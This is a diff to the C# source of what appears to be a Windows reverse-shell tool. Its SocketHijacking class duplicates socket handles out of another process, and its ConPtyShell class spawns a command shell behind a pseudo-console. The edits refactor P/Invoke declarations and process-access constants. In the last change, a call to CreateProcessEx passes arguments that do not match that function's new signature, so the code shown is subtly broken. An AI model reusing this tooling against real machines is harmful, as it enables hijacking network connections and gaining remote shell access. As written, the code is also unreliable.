@@ -68,17 +68,15 @@ public static class SocketHijacking
     private const uint NTSTATUS_INFOLENGTHMISMATCH = 0xc0000004;
     private const uint NTSTATUS_BUFFEROVERFLOW = 0x80000005;
     private const uint NTSTATUS_BUFFERTOOSMALL = 0xc0000023;
-    private const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;
+    private const int NTSTATUS_PENDING = 0x00000103;
     private const int WSA_FLAG_OVERLAPPED = 0x1;
     private const int DUPLICATE_SAME_ACCESS = 0x2;
     private const int SystemHandleInformation = 16;
+    private const int PROCESS_DUP_HANDLE = 0x0040;
     private const int SIO_TCP_INFO = unchecked((int)0xD8000027);
     private const int SG_UNCONSTRAINED_GROUP = 0x1;
     private const int SG_CONSTRAINED_GROUP = 0x2;
     private const uint IOCTL_AFD_GET_CONTEXT = 0x12043;
-    private const uint IOCTL_AFD_SET_CONTEXT = 0x12047;
-    private const int STATUS_SUCCESS = 0;
-    private const int STATUS_PENDING = 0x00000103;
     private const int EVENT_ALL_ACCESS = 0x1f0003;
     private const int SynchronizationEvent = 1;
     private const UInt32 INFINITE = 0xFFFFFFFF;
@@ -172,24 +170,6 @@ public static class SocketHijacking
         public IntPtr Buffer;
     }
 
-    [Flags]
-    private enum ProcessAccessFlags : uint
-    {
-        All = 0x001F0FFF,
-        Terminate = 0x00000001,
-        CreateThread = 0x00000002,
-        VirtualMemoryOperation = 0x00000008,
-        VirtualMemoryRead = 0x00000010,
-        VirtualMemoryWrite = 0x00000020,
-        DuplicateHandle = 0x00000040,
-        CreateProcess = 0x000000080,
-        SetQuota = 0x00000100,
-        SetInformation = 0x00000200,
-        QueryInformation = 0x00000400,
-        QueryLimitedInformation = 0x00001000,
-        Synchronize = 0x00100000
-    }
-
     [StructLayout(LayoutKind.Sequential)]
     private struct WSAData
     {
@@ -276,7 +256,6 @@ public static class SocketHijacking
     {
         public UInt16 l_onoff;
         public UInt16 l_linger;
-
     }
 
     [StructLayout(LayoutKind.Sequential, Pack = 0)]
@@ -376,7 +355,7 @@ public static class SocketHijacking
     private static extern int closesocket(IntPtr s);
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
+    private static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
@@ -403,9 +382,6 @@ public static class SocketHijacking
     // NtDeviceIoControlFile1 implementation specific for IOCTL_AFD_GET_CONTEXT IoControlCode
     [DllImport("ntdll.dll", EntryPoint = "NtDeviceIoControlFile")]
     private static extern int NtDeviceIoControlFile1(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, uint IoControlCode, IntPtr InputBuffer, int InputBufferLength, ref SOCKET_CONTEXT OutputBuffer, int OutputBufferLength);
-
-    [DllImport("ntdll.dll")]
-    static extern int NtClose(IntPtr hObject);
 
 
     //helper method with "dynamic" buffer allocation
@@ -558,7 +534,7 @@ public static class SocketHijacking
         List<IntPtr> socketsHandles = new List<IntPtr>();
         DeadlockCheckHelper deadlockCheckHelperObj = new DeadlockCheckHelper();
 
-        hTargetProcess = OpenProcess(ProcessAccessFlags.DuplicateHandle, false, targetProcess.Id);
+        hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, false, targetProcess.Id);
         if (hTargetProcess == IntPtr.Zero)
         {
             Console.WriteLine("Cannot open target process with pid " + targetProcess.Id.ToString() + " for DuplicateHandle access");
@@ -671,7 +647,7 @@ public static class SocketHijacking
         SOCKET_CONTEXT contextData = new SOCKET_CONTEXT();
 
         ntStatus = NtCreateEvent(ref sockEvent, EVENT_ALL_ACCESS, IntPtr.Zero, SynchronizationEvent, false);
-        if (ntStatus != STATUS_SUCCESS)
+        if (ntStatus != NTSTATUS_SUCCESS)
         {
             Console.WriteLine("debug: NtCreateEvent failed with error code 0x" + ntStatus.ToString("X8")); ;
             return ret;
@@ -680,15 +656,15 @@ public static class SocketHijacking
         IO_STATUS_BLOCK IOSB = new IO_STATUS_BLOCK();
         ntStatus = NtDeviceIoControlFile1(socket, sockEvent, IntPtr.Zero, IntPtr.Zero, ref IOSB, IOCTL_AFD_GET_CONTEXT, IntPtr.Zero, 0, ref contextData, Marshal.SizeOf(contextData));
         // Wait for Completion 
-        if (ntStatus == STATUS_PENDING)
+        if (ntStatus == NTSTATUS_PENDING)
         {
             WaitForSingleObject(sockEvent, INFINITE);
             ntStatus = IOSB.status;
         }
 
-        NtClose(sockEvent);
+        CloseHandle(sockEvent);
 
-        if (ntStatus != STATUS_SUCCESS)
+        if (ntStatus != NTSTATUS_SUCCESS)
         {
             Console.WriteLine("debug: NtDeviceIoControlFile failed with error code 0x" + ntStatus.ToString("X8")); ;
             return ret;
@@ -788,7 +764,6 @@ public static class ConPtyShell
     private const uint DISABLE_NEWLINE_AUTO_RETURN = 0x0008;
     private const uint PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
     private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
-    private const uint CREATE_NO_WINDOW = 0x08000000;
     private const int STARTF_USESTDHANDLES = 0x00000100;
     private const int BUFFER_SIZE_PIPE = 1048576;
     private const int WSA_FLAG_OVERLAPPED = 0x1;
@@ -891,12 +866,12 @@ public static class ConPtyShell
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
 
-    [DllImport("kernel32.dll", SetLastError = true)]
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+    private static extern bool CreateProcessEx(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
-    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
-    private static extern bool CreateProcessW(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
+    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
@@ -1314,7 +1289,7 @@ public static class ConPtyShell
             sInfo.hStdInput = InputPipeRead;
             sInfo.hStdOutput = OutputPipeWrite;
             sInfo.hStdError = OutputPipeWrite;
-            CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
+            CreateProcessEx(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
         }
         // Note: We can close the handles to the PTY-end of the pipes here
         // because the handles are dup'ed into the ConHost and will be released
